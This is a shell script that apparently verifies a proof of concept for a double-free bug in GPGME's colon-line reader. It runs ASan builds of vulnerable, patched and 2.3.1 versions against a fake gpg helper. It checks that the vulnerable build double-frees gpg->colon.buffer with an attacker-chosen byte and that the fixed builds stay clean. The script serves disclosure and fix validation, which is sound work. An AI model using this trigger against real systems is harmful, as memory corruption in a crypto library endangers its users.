#!/bin/sh
# Second affected reader of CVE-2026-129975: read_colon_line() reallocs its
# 1024-byte buffer on a long no-LF colon record, then EOF returns before the
# pointer writeback. The next public operation double-frees gpg->colon.buffer.
# No rebuild and no network; requires the ASan builds from build-real.sh.
set -u
cd "$(dirname "$0")" || exit 2
mkdir -p evidence
pass=0; fail=0
check() {
  if [ "$1" = "$2" ]; then pass=$((pass+1));
  else fail=$((fail+1)); echo "FAIL: $3 (got '$1', want '$2')"; fi
}
hash() { sha256sum "$1" | cut -d' ' -f1; }

check "$(hash ../pinned/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "pinned engine-gpg.c"
check "$(grep -cE 'gpg->colon.buffer +[=] buffer;' gpgme-2.3.1/src/engine-gpg.c)" 1 "2.3.1 immediate colon writeback"
check "$(hash gpgme-2.2.0/src/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "built vulnerable source"
check "$(hash gpgme-fixed/src/engine-gpg.c)" 10179f7853d9284a21af4ad4ab94753654aa40119f9bdef43852e98482b75b08 "built patched source"

ASAN_OPTIONS=detect_leaks=0 ./colon-reuse-vuln ./fake-colongpg.py \
  >evidence/colon-vuln.out 2>&1
echo $? >evidence/colon-vuln.rc
for b in fixed 231; do
  ASAN_OPTIONS=detect_leaks=0 "./colon-reuse-$b" ./fake-colongpg.py \
    >"evidence/colon-$b.out" 2>&1
  echo $? >"evidence/colon-$b.rc"
done
COLON_SAFE=1 ASAN_OPTIONS=detect_leaks=0 ./colon-reuse-vuln ./fake-colongpg.py \
  >evidence/colon-safe.out 2>&1
echo $? >evidence/colon-safe.rc

check "$(cat evidence/colon-vuln.rc)" 1 "vulnerable colon attack faults"
check "$(grep -c 'attempting double-free' evidence/colon-vuln.out)" 1 "ASan names double free"
check "$(grep -c 'gpg_release .*engine-gpg.c:604' evidence/colon-vuln.out)" 1 "second free in real gpg_release"
check "$(grep -c 'read_colon_line .*engine-gpg.c:1647' evidence/colon-vuln.out)" 1 "first free in real read_colon_line realloc"
check "$(grep -c 'gpg_set_colon_line_handler .*engine-gpg.c:909' evidence/colon-vuln.out)" 1 "stale block allocated as colon buffer"
check "$(grep -c 'status_cb keyword=GOOD arglen=1200 byte\[1000\]=0x48' evidence/colon-vuln.out)" 1 "chosen byte in first callback"
check "$(grep -c 'op2 keylist_start err=Success' evidence/colon-vuln.out)" 0 "second op never starts in vulnerable build"

check "$(cat evidence/colon-safe.rc)" 0 "vulnerable short-colon-line control rc"
check "$(grep -c AddressSanitizer evidence/colon-safe.out)" 0 "vulnerable short-colon-line control clean"
check "$(grep -c 'op2 keylist_start err=Success' evidence/colon-safe.out)" 1 "safe control starts second op"
check "$(grep -c 'release done' evidence/colon-safe.out)" 1 "safe control clean release"

for b in fixed 231; do
  check "$(cat "evidence/colon-$b.rc")" 0 "colon-$b rc"
  check "$(grep -c AddressSanitizer "evidence/colon-$b.out")" 0 "colon-$b sanitizer-clean"
  check "$(grep -c 'op2 keylist_start err=Success' "evidence/colon-$b.out")" 1 "colon-$b second op starts"
  check "$(grep -c 'status_cb keyword=GOOD arglen=1200 byte\[1000\]=0x5a' "evidence/colon-$b.out")" 1 "colon-$b second op receives chosen marker"
  check "$(grep -c 'release done' "evidence/colon-$b.out")" 1 "colon-$b clean release"
done
check "$(grep -c 'gpgme version=2.3.1' evidence/colon-231.out)" 1 "2.3.1 control is the real release"

echo "PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
